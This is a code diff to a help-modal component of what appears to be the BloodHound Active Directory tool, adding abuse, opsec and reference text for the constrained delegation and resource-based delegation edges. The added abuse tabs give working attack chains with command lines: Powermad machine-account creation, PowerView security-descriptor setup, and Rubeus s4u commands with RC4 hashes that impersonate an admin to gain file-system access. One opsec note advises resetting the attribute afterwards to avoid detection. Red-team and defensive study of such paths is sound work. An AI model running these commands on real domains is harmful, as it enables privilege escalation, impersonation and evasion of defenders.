@@ -101,7 +101,7 @@ export default class HelpModal extends Component {
         } else if (edge.label === "AllowedToDelegate") {
             let text = `The {} {} has the constrained delegation privilege to the computer {}.
             
-            The constrained delegation primitive allows a principal to authenticate as any user to specific services (found in the msds-AllowedToDelegateTo LDAP property in the source node tab) on the target computer. That is, a node with this privilege can impersonate any domain principal (including Domain Admins) to the specific service on the target host.
+            The constrained delegation primitive allows a principal to authenticate as any user to specific services (found in the msds-AllowedToDelegateTo LDAP property in the source node tab) on the target computer. That is, a node with this privilege can impersonate any domain principal (including Domain Admins) to the specific service on the target host. One caveat- impersonated users can not be in the "Protected Users" security group or otherwise have delegation privileges revoked.
             
             An issue exists in the constrained delegation where the service name (sname) of the resulting ticket is not a part of the protected ticket information, meaning that an attacker can modify the target service name to any service of their choice. For example, if msds-AllowedToDelegateTo is “HTTP/host.domain.com”, tickets can be modified for LDAP/HOST/etc. service names, resulting in complete server compromise, regardless of the specific service listed.`;
             formatted = text.format(sourceType, sourceName, targetName);
@@ -123,6 +123,14 @@ export default class HelpModal extends Component {
             formatted = `The ${sourceType} ${sourceName} contains the ${targetType} ${targetName}. GPOs linked to a container apply to all objects that are contained by the container.`;
         } else if (edge.label === "GpLink") {
             formatted = `The GPO ${sourceName} is linked to the ${targetType} ${targetName}. A linked GPO applies its settings to objects in the linked container.`;
+        } else if (edge.label === "AddAllowedToAct") {
+            formatted = `${this.groupSpecialFormat(source)} can modify the msds-AllowedToActOnBehalfOfOtherIdentity attribute on the computer ${targetName}.
+            
+            The ability to modify the msDS-AllowedToActOnBehalfOfOtherIdentity property allows an attacker to abuse resource-based constrained delegation to compromise the remote computer system. This property is a binary DACL that controls what security principals can pretend to be any domain user to the particular computer object.
+            
+            If the msDS-AllowedToActOnBehalfOfOtherIdentity DACL is set to allow an attack-controller account, the attacker can use said account to execute a modified S4U2self/S4U2proxy abuse chain to impersonate any domain user to the target computer system and receive a valid service ticket "as" this user.
+            
+            One is that impersonated users can not be in the "Protected Users" security group or otherwise have delegation privileges revoked. Another caveat is that the principal added to the msDS-AllowedToActOnBehalfOfOtherIdentity DACL *must* have a service pricipal name (SPN) set in order to successfully abuse the S4U2self/S4U2proxy process. If an attacker does not currently control an account with a SPN set, an attacker can abuse the default domain MachineAccountQuota settings to add a computer account that the attacker controls via the Powermad project.`;
         }
 
         this.setState({ infoTabContent: { __html: formatted } })
@@ -705,7 +713,7 @@ export default class HelpModal extends Component {
 
                 <code>Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname</code>
 
-                <h4> Force Change Password </h4>
+                <h4>Force Change Password </h4>
                 There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).
 
                 To abuse this privilege with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as ${sourceType === "User" ? `${sourceName} if you are not running a process as that user` : `a member of ${sourceName} if you are not running a process as a member`}. To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):
@@ -868,7 +876,11 @@ export default class HelpModal extends Component {
             `;
             formatted = text.format(sourceType, sourceName, targetName);
         } else if (edge.label === "AllowedToDelegate") {
-            let text = `Abusing this privilege will require either using Benjamin Delpy’s Kekeo project on a compromised host, or proxying in traffic generated from the Impacket library. See the references tab for more detailed information on exploiting this privilege.`;
+            let text = `Abusing this privilege can utilize Benjamin Delpy’s Kekeo project, proxying in traffic generated from the Impacket library, or using the Rubeus project's s4u abuse.
+
+            In the following example, *victim* is the attacker-controlled account (i.e. the hash is known) that is configured for constrained delegation. That is, *victim* has the "HTTP/PRIMARY.testlab.local" service principal name (SPN) set in its msds-AllowedToDelegateTo property. The command first requests a TGT for the *victim* user and executes the S4U2self/S4U2proxy process to impersonate the "admin" user to the "HTTP/PRIMARY.testlab.local" SPN. The alternative sname "cifs" is substituted in to the final service ticket and the ticket is submitted to the current logon session. This grants the attacker the ability to access the file system of PRIMARY.testlab.local as the "admin" user.
+
+            <code>Rubeus.exe s4u /user:victim /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:admin /msdsspn:"HTTP/PRIMARY.testlab.local" /altservice:cifs /ptt</code>`;
             formatted = text.format(sourceType, sourceName, targetName);
         } else if (edge.label === "GetChanges") {
             let text = `With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz:
@@ -898,6 +910,34 @@ export default class HelpModal extends Component {
             formatted = `There is no abuse info related to this edge.`;
         } else if (edge.label === "GpLink") {
             formatted = `There is no abuse info related to this edge.`;
+        } else if (edge.label === "AddAllowedToAct"){
+            formatted = `Abusing this primitive is currently only possible through the Rubeus project.
+            
+            First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:
+            
+            <code>New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)</code>
+            
+            PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:
+            
+            <code>$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid</code>
+            
+            We now need to build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE:
+            
+            <code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+            $SDBytes = New-Object byte[] ($SD.BinaryLength)
+            $SD.GetBinaryForm($SDBytes, 0)</code>
+            
+            Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
+            
+            <code>$RawBytes = Get-DomainComputer "TARGETCOMPUTER" -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity</code>
+            
+            We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
+            
+            <code>Rubeus.exe hash /password:Summer2018!</code>
+            
+            And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
+            
+            <code>Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt</code>`;
         }
 
         this.setState({ abuseTabContent: { __html: formatted } })
@@ -975,7 +1015,7 @@ export default class HelpModal extends Component {
             Many DCOM servers spawn under the process “svchost.exe -k DcomLaunch” and typically have a command line containing the string “ -Embedding” or are executing inside of the DLL hosting process “DllHost.exe /Processid:{<AppId>}“ (where AppId is the AppId the COM object is registered to use).  Certain COM services are implemented as service executables; consequently, service-related event logs may be generated.`;
             formatted = text;
         } else if (edge.label === "AllowedToDelegate") {
-            let text = `As mentioned in the abuse info, in order to currently abuse this primitive either the Kekeo binary will need to be dropped to disk on the target or traffic from Impacket will need to be proxied in. See the References for more information.`;
+            let text = `As mentioned in the abuse info, in order to currently abuse this primitive the Rubeus C# assembly needs to be executed on some system with the ability to send/receive traffic in the domain. See the References for more information.`;
             formatted = text;
         } else if (edge.label === "GetChanges") {
             let text = `For detailed information on detection of dcsync as well as opsec considerations, see the adsecurity post in the references tab.`;
@@ -990,6 +1030,8 @@ export default class HelpModal extends Component {
             formatted = `There are no opsec considerations related to this edge.`;
         } else if (edge.label === "GpLink") {
             formatted = `There are no opsec considerations related to this edge.`;
+        }else if (edge.label === "AddAllowedToAct"){
+            formatted = `To execute this attack, the Rubeus C# assembly needs to be executed on some system with the ability to send/receive traffic in the domain. Modification of the *msDS-AllowedToActOnBehalfOfOtherIdentity* property against the target also must occur, whether through PowerShell or another method. The property should be cleared (or reset to its original value) after attack execution in order to prevent easy detection.`;
         }
 
         this.setState({ opsecTabContent: { __html: formatted } })
@@ -1101,10 +1143,13 @@ export default class HelpModal extends Component {
             <a href="https://github.com/codewhitesec/LethalHTA/ ">https://github.com/codewhitesec/LethalHTA/ </a>`;
             formatted = text;
         } else if (edge.label === "AllowedToDelegate") {
-            let text = `<a href="https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/">https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/</a>
+            let text = `<a href="https://github.com/GhostPack/Rubeus#s4u">https://github.com/GhostPack/Rubeus#s4u</a>
+            <a href="https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/">https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/</a>
             <a href="http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/">http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/</a>
             <a href="https://twitter.com/gentilkiwi/status/806643377278173185">https://twitter.com/gentilkiwi/status/806643377278173185</a>
-            <a href="https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more">https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more</a>`;
+            <a href="https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more">https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more</a>
+            <a href="http://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/">http://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/</a>
+            <a href="http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/">http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/</a>`;
             formatted = text;
         } else if (edge.label === "GetChanges") {
             let text = `<a href="https://adsecurity.org/?p=1729">https://adsecurity.org/?p=1729</a>
@@ -1124,6 +1169,13 @@ export default class HelpModal extends Component {
         } else if (edge.label === "GpLink") {
             formatted = `<a href="https://wald0.com/?p=179">https://wald0.com/?p=179</a>
             <a href="https://blog.cptjesus.com/posts/bloodhound15">https://blog.cptjesus.com/posts/bloodhound15</a>`;
+        }else if (edge.label === "AddAllowedToAct"){
+            formatted = `<a href="https://eladshamir.com/2019/01/28/Wagging-the-Dog.html">https://eladshamir.com/2019/01/28/Wagging-the-Dog.html</a>
+            <a href="https://github.com/GhostPack/Rubeus#s4u">https://github.com/GhostPack/Rubeus#s4u</a>
+            <a href="https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff">https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff</a>
+            <a href="http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/">http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/</a>
+            <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a>
+            <a href="https://github.com/Kevin-Robertson/Powermad#new-machineaccount">https://github.com/Kevin-Robertson/Powermad#new-machineaccount</a>`;
         }
 
         this.setState({ referencesTabContent: { __html: formatted } })
